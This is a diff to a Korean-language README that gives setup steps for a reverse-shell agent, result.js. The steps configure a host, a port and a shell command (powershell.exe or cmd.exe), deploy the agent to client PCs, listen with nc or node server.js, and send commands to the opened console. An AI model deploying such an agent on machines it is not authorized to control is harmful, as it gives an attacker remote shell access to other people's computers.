@@ -9,8 +9,8 @@
 
 ★x2 코드 수정(result.js)
 1) 리버스쉘을 연결할 서버 호스트(HOST_Address, HOST_PORT) 등록
-const HOST_Address = "naver.com" or "8.8.8.8"
-const HOST_PORT = ["111"]
+const HOST_Address = [연결할 서버의 주소 입력]
+const HOST_PORT = ["연결할 서버의 포트 입력"]
 
 2) 리버스쉘 연결할 Command(COMMAND) 등록
 const COMMAND  = "powershell.exe", "cmd.exe"
@@ -21,7 +21,7 @@ const COMMAND  = "powershell.exe", "cmd.exe"
 3) 에이전트 파일 Client PC 배포
 
 ★x4 Server 측 포트 리스닝
-1) nc -l HOST_PORT
+1) node server.js
 2) 대기
 
 ★x5 Client PC 측 에이전트 파일 실행
@@ -29,6 +29,7 @@ const COMMAND  = "powershell.exe", "cmd.exe"
 2) Connected 인 경우 연결성공
 
 ★x6 Server 
-1) Client 로부터 전달받은 데이터 또는 Shell 획득
+1) Open 된 Console 에 전달할 명령어를 삽입
+dir, netstat, powershell.exe, echo [input text] [path]...
 
 
